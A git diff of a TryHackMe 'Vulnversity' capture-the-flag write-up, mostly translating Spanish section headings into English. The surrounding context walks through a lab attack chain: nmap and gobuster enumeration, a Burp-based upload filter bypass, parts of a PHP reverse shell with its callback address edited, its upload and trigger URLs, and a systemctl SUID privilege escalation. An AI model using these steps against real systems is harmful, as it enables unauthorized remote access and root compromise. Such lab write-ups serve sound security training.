@@ -1,4 +1,7 @@
-# Basic Pentesting — Writeup
+# Vulnversity — Writeup
+
+**Fecha:** 28-09-2025 
+**Plataforma:** TryHackMe
 
 ## TL;DR
 
@@ -6,13 +9,13 @@ Se encontraron servicios FTP, SSH, Samba y un servicio web con un directorio de 
 
 ---
 
-## Enumeración (nmap)
+## Enumeration (nmap)
 
 ```bash
 nmap -sV -sC --open $IP -oN scan.txt
 ```
 
-**Comentario:** `-sV` detecta versiones de servicios; `-sC` ejecuta scripts por defecto; `--open` muestra solo los puertos abiertos; `-oN` guarda la salida en un archivo normal.
+**Comment:** `-sV` detecta versiones de servicios; `-sC` ejecuta scripts por defecto; `--open` muestra solo los puertos abiertos; `-oN` guarda la salida en un archivo normal.
 
 **Resultado**
 ```bash
@@ -43,7 +46,7 @@ Host script results:
 |   date: 2025-09-27T20:40:34
 |_  start_date: N/A
 ```
-**Resumen**
+**Summary**
 
 * 21/tcp open ftp (vsftpd/3.0.5)
 * 22/tcp open  ssh (OpenSSH 8.2p1)
@@ -53,22 +56,22 @@ Host script results:
 
 ---
 
-## Enumeración de directorios web (Gobuster)
+## Web Enumeration (Gobuster)
 
 ```bash
 gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 ```
 
-**Comentario:** `-u` url target; `-w` ruta de wordlist.
+**Comment:** `-u` url target; `-w` ruta de wordlist.
 
-**Resultado**
+**Result**
 ```bash
 /images               (Status: 301) [Size: 322] [--> http://$IP:3333/images/]                                                                   
 /css                  (Status: 301) [Size: 319] [--> http://$IP:3333/css/]                                                                      
 /js                   (Status: 301) [Size: 318] [--> http://$IP:3333/js/]                                                                       
 /internal             (Status: 301) [Size: 324] [--> http://$IP:3333/internal/] 
 ```
-**Resultado relevante**
+**Relevant Result**
 
 * `/internal`, directorio web para subir archivos.
   
@@ -76,7 +79,7 @@ gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/dirbuster/directory-list
 
 ## Burp Suite
 
-**Petición POST**
+**Http POST**
 
 Interceptamos la petición POST al subir un archivo a la web con el proxy de BurpSuite, la enviamos al Intruder y marcamos la extensión.
 ```bash
@@ -107,7 +110,7 @@ Submit
 ------WebKitFormBoundaryJ8PkprBlb27KbdYV--
 ```
 
-**Identificar extensión permitida**
+**Find extension**
 
 Aplicamos una wordlist de extensiones (phpext.txt) como payload para identificar la correcta:
 <details>
@@ -121,7 +124,7 @@ Aplicamos una wordlist de extensiones (phpext.txt) como payload para identificar
 	
 </details>
 
-**Resultado**
+**Result**
 * Extensión permitida: `.phtml`
 
 ---
@@ -135,7 +138,7 @@ Aplicamos una wordlist de extensiones (phpext.txt) como payload para identificar
 	<?php
 	set_time_limit (0);
 	$VERSION = "1.0";
-	$ip = '127.0.0.1';  // CHANGE THIS
+	$ip = '$IP';  // CHANGE THIS
 	$port = 1234;       // CHANGE THIS
 	$chunk_size = 1400;
 	$write_a = null;
@@ -280,12 +283,12 @@ Aplicamos una wordlist de extensiones (phpext.txt) como payload para identificar
 
 </details>
 
-**Subida reverse shell php**
+**Upload reverse shell php**
 ```bash
 	http://$IP:3333/internal/
 ```	
 
-**Ejecución Payload**
+**Execute Payload**
 ```bash
 	http://$IP:3333/internal/uploads/php-reverse-shell.phtml
 ```
@@ -310,9 +313,9 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ---
 
-## Escalada Privilegios
+## Privilege Escalation
 
-**Búsqueda binarios SUID**
+**Find SUID Files**
 ```bash
  find / -user root -perm -4000 -exec ls -ldb {} \;
 ```
@@ -328,7 +331,7 @@ WantedBy=multi-user.target' > $TF
 /bin/systemctl link $TF
 /bin/systemctl enable --now $TF
 ```
-**Leer Flag**
+**Cat Flag**
 ```bash
-	$ cd /tmp/flag
+	$ cat /tmp/flag
 ```
